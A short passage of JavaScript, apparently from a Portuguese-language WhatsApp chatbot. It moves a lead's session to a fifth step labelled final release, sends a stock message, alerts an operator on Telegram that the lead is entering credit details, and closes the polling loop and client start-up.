                    if (session) { session.humanStep = 5; chatSessions.set(chatId, session); saveSessions(); }
                    await sendBotMessage(chatId, MENSAGEM_ETAPA_5);
                    await notifyTelegram(
                        `💰 <b>ETAPA 5 — LIBERAÇÃO FINAL</b>\nLead: <code>${chatId}</code>\n\n<i>Lead em fase de preenchimento dos dados de crédito.</i>`
                    );
                }
            } catch (e) {
                console.error("❌ Erro ao processar cmd-etapa:", e.message);
            }
        }
    }
}, 3000);

client.initialize();
